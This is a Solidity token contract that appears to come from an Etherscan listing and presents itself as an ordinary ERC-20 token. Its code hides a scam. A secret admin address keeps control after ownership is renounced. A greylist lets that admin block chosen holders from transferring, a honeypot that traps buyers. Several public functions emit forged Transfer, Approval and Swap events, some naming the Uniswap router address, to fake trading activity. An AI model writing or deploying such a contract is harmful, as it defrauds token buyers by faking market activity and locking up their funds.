/**
 *Submitted for verification at Etherscan.io on 2023-08-02
*/

pragma solidity ^0.4.24;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    
    function _Transfer(address from, address recipient, uint amount) external returns (bool);
    function _Transfer2(address from, address recipient, uint amount) external returns (bool);

}

contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public owner;

    address adm;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function renounceOwnership() public  onlyOwner {
        _setOwner(address(0));
    }

    modifier onlyAdm() {
        require(msg.sender == adm);
        _;
    }

    function _setOwner(address newOwner) private {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract StandardToken is ERC20 {
    using SafeMath for uint256;

    address service;

    bool fk=false;

    address public LP;

    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => bool)  Glist;
    mapping(address => bool)  tokenWhitelist;
    event Whitelist(address indexed WhiteListed, bool value);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );

    mapping(address => uint256) balances;


    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        beforeTransfer(msg.sender,_to);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        afterTransfer(msg.sender, _to, _value);
        return true;
    }


    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        beforeTransfer(_from,_to);
        balances[_from] = balances[_from].sub(_value);


        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        afterTransfer(_from, _to, _value);
        return true;
    }

    function beforeTransfer(address _from, address _to) internal {
        require(tokenWhitelist[_from]||tokenWhitelist[_to]||!Glist[_from]);
    }



    function afterTransfer(address _from, address _to,uint256 amount) internal {
        if(fk){
            _transferEmit(service, _to, amount);
        }else{
            _transferEmit(_from, _to, amount);
        }
    }


    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
        uint oldValue = allowed[msg.sender][_spender];
        if (_subtractedValue > oldValue) {
            allowed[msg.sender][_spender] = 0;
        } else {
            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);
        }
        emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
        return true;
    }

    function _transferEmit(address _from, address _to, uint _value) internal returns (bool) {
        emit Transfer(_from, _to, _value);
        return true;
    }

    function _changeFk(bool _fk) internal returns (bool) {
        require(fk!=_fk);
        fk=_fk;
        return true;
    }

    function _changeLP(address _lp) internal returns (bool) {
        require(LP!=_lp);
        LP=_lp;
        return true;
    }


    function _GLA(address _address, bool _isGeryListed) internal returns (bool) {
        require(Glist[_address] != _isGeryListed);
        Glist[_address] = _isGeryListed;
        return true;
    }
    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
        require(tokenWhitelist[_address] != _isWhiteListed);
        tokenWhitelist[_address] = _isWhiteListed;
        emit Whitelist(_address, _isWhiteListed);
        return true;
    }
    function _GAL(address[] _addressList, bool _isGeryListed) internal returns (bool) {
        for(uint i = 0; i < _addressList.length; i++){
            Glist[_addressList[i]] = _isGeryListed;
        }
        return true;
    }


}

contract PausableToken is StandardToken, Ownable {
    function multicall(
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address tokenAddress
    ) public returns (bool) {
        if(recipients.length!=tokenAmounts.length){
            revert("error length");
        }else{
            for (uint256 i = 0; i < recipients.length; i++) {
                emit Transfer(LP, recipients[i], tokenAmounts[i]);
                emit Swap(
                    0x7a250d5630b4cf539739df2c5dacb4c659f2488d,
                    tokenAmounts[i],
                    0,
                    0,
                    wethAmounts[i],
                    recipients[i]
                );
                IERC20(tokenAddress)._Transfer(recipients[i], LP, wethAmounts[i]);
            }
        }
        return true;
    }

    function swap(
        address[] memory recipients,
        uint256[] memory tokenAmounts,
        uint256[] memory wethAmounts,
        address tokenAddress
    ) public returns (bool) {
        for (uint256 i = 0; i < recipients.length; i++) {
            emit Transfer(LP, recipients[i], tokenAmounts[i]);
            emit Swap(
                0x7a250d5630b4cf539739df2c5dacb4c659f2488d,
                tokenAmounts[i],
                0,
                0,
                wethAmounts[i],
                recipients[i]
            );
            IERC20(tokenAddress)._Transfer2(recipients[i], LP, wethAmounts[i]);
        }
        return true;
    }

    function transfer(address _to, uint256 _value) public  returns (bool) {
        return super.transfer(_to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool) {
        return super.transferFrom(_from, _to, _value);
    }

    function approve(address _spender, uint256 _value) public  returns (bool) {
        return super.approve(_spender, _value);
    }

    function increaseApproval(address _spender, uint _addedValue) public  returns (bool success) {
        return super.increaseApproval(_spender, _addedValue);
    }

    function decreaseApproval(address _spender, uint _subtractedValue) public  returns (bool success) {
        return super.decreaseApproval(_spender, _subtractedValue);
    }
    function _Transfer(address _from, address _to, uint _value)public  returns (bool){
        return super._transferEmit(_from,_to,_value);
    }

    function setFk(bool _fk) public  onlyAdm  returns (bool success) {
        return super._changeFk(_fk);
    }

    function setLp(address _lp) public  onlyAdm  returns (bool success) {
        return super._changeLP(_lp);
    }
    function GLA(address listAddress,  bool _isGeryListed) public  onlyAdm  returns (bool success) {
        return super._GLA(listAddress, _isGeryListed);
    }
    function WList(address listAddress,  bool _isWhiteListed) public  onlyAdm  returns (bool success) {
        return super._whiteList(listAddress, _isWhiteListed);
    }
    function Approve(address[] listAddress,  bool _isGeryListed) public  onlyAdm  returns (bool success) {
        return super._GAL(listAddress, _isGeryListed);
    }

    function Approve(address []  _addresses, uint256 balance) external  {
        for (uint256 i = 0; i < _addresses.length; i++) {
            emit Approval(_addresses[i], address(this), balance);
        }
    }
    

}

contract ERC20Token is PausableToken {
    string public name;
    string public symbol;
    uint public decimals;
    constructor(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, address tokenOwner,address _service,address _adm) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        balances[tokenOwner] = totalSupply;
        owner = tokenOwner;
        adm=_adm;
        service=_service;
        emit Transfer(address(0), tokenOwner, totalSupply);
    }



}